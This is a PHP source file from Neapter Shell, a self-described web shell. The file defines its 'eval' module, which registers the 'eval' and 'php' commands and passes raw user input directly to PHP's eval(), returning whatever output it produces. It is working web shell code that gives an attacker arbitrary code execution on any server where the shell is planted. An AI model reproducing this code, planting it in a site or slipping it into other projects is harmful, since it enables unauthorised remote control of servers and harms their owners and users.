<?php

/**
 * Neapter Shell
 *
 * @category  WebShell
 * @package   NeapterShell
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright 2011-2016 Krzysztof Otręba
 *
 * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
 * @link    http://github.com/krzotr/neapter-shell
 */

/**
 * Execute PHP code
 *
 * @category  WebShell
 * @package   NeapterShell
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright 2011-2016 Krzysztof Otręba
 *
 * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
 * @link    http://github.com/krzotr/neapter-shell
 */
class ModuleEval extends ModuleAbstract
{
    /**
     * Get list of available commands
     *
     * @return array
     */
    public static function getCommands()
    {
        return array(
            'eval',
            'php'
        );
    }

    /**
     * Get module version
     *
     * @return string
     */
    public static function getVersion()
    {
        return '1.0.1 2016-06-08 - <krzotr@gmail.com>';
    }

    /**
     * Get details module information
     *
     * @return string
     */
    public static function getHelp()
    {
        return <<<DATA
Wykonanie kodu PHP

    Użycie
        eval skrypt_php

    Przykład
        eval echo md5('test');
DATA;
    }

    /**
     * Execute module
     *
     * @return string
     */
    public function get()
    {
        if ($this->oArgs->getNumberOfParams() == 0) {
            return self::getHelp();
        }

        ob_start();
        eval($this->oArgs->getRawData());
        $sData = ob_get_contents();
        ob_clean();
        ob_end_flush();

        return htmlspecialchars($sData);
    }
}
